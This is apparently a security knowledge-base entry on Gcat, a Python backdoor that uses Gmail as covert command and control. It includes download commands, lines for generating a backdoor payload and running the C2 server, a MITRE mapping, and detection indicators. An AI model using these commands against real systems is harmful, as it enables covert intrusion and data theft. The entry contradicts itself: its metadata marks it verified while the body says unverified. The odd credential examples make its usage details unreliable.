---
id: 0f1ff80f-c33d-4274-ba81-12ad8727ee78
type: tool
verified: true
created_at: '2019-08-28T21:17:33.888892+00:00'
updated_at: '2023-05-29T16:48:53.029709+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - c2
  - backdoor
  - gmail
  - post-exploitation
url: 'https://www.msuiche.net/gcat'
validated: true
---

# Gcat

**Status**: Unverified

## Overview

Gcat is a stealthy Python-based backdoor tool that leverages Gmail as a command and control (C2) server. It allows attackers to maintain persistence and execute commands on compromised systems without establishing direct network connections, making it suitable for environments with restricted outbound traffic.

## Description

Gcat operates by having the backdoor on the target system periodically poll a designated Gmail account for encrypted commands. The operator uses another instance to send commands via email, which are then decrypted and executed on the target. This design evades traditional network-based detection by blending into normal email traffic. It supports command execution, file upload/download, and basic persistence mechanisms. Commonly used in post-exploitation scenarios where direct C2 channels are blocked.

## Features

- **Gmail-based C2**: Uses IMAP/SMTP for command issuance and exfiltration, avoiding suspicious ports.
- **Encryption**: Commands and data are encrypted to prevent interception.
- **Stealth**: No persistent listener; polls at configurable intervals.
- **Cross-platform**: Python implementation works on multiple OSes.
- **Modular**: Supports custom command modules for extended functionality.

## Installation

### Requirements

- Python 2.7 (original implementation; Python 3 ports may exist)
- Gmail account for C2
- IMAP/SMTP access enabled on Gmail (app passwords recommended)

### Install Commands

```bash
# Download the Gcat script from the official source
wget https://www.msuiche.net/wp-content/uploads/2013/08/gcat.py -O gcat.py

# Or clone if available from a repo (community forks exist)
git clone https://github.com/luckydonald/gcat.git
cd gcat
pip install -r requirements.txt  # If requirements file exists; typically minimal
```

For Windows, use Python installer and run via command prompt.

## Basic Usage

```bash
python gcat.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| `-h, --help` | Show help message |
| `--email` | Gmail address for C2 |
| `--password` | Gmail password or app password |
| `--interval` | Polling interval in seconds (default: 60) |
| `--generate` | Generate backdoor payload |
| `--server` | Run in server mode to send commands |

## Examples

### Example 1: Basic Usage

Generate a backdoor payload:

```bash
python gcat.py --generate --email victim@gmail.com --password victimpass --output backdoor.py
```

### Example 2: Advanced Usage

Start the C2 server to monitor and issue commands:

```bash
python gcat.py --server --email attacker@gmail.com --password apppass --interval 30
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Mail Protocols]] Application Layer Protocol: Mail Protocols
- [[Asymmetric Cryptography]] Encrypted Channel: Asymmetric Cryptography

### Tactics

- [[Command and Control]] Command And Control
- [[Defense Evasion]] Defense Evasion

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual IMAP/SMTP traffic from internal hosts to Gmail servers.
- Python processes polling email at regular intervals.
- Encrypted email content with base64 or custom encoding in Gmail inboxes.
- File system artifacts like gcat.py or generated backdoors.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Meterpreter]]
- [[tools/Empire]]

## References

- Official blog post: https://www.msuiche.net/gcat
- Community forks: Search GitHub for "gcat c2"
